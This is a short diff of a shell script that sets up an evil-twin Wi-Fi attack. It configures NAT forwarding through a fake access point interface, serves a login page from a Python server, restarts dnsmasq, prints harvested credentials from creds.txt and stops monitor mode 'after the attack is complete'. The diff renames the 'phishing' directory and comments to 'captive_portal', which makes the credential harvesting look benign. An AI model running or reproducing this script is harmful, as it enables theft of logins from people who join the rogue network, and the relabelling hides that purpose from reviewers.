@@ -31,16 +31,16 @@ sudo iptables --table nat --append POSTROUTING --out-interface wlan0 -j MASQUERA
 sudo iptables --append FORWARD --in-interface at0 -j ACCEPT
 
 # Create the phishing directory
-mkdir ~/phishing
-cd ~/phishing
+mkdir ~/captive_portal
+cd ~/captive_portal
 
-# Start the Python server to host the phishing page
+# Start the Python server to host the captive portal page
 sudo python3 server.py
 
 systemctl restart dnsmasq
 
 # View the captured credentials
-cat ~/phishing/creds.txt
+cat ~/captive_portal/creds.txt
 
 # Stop monitor mode after the attack is complete
 sudo airmon-ng stop wlan1mon
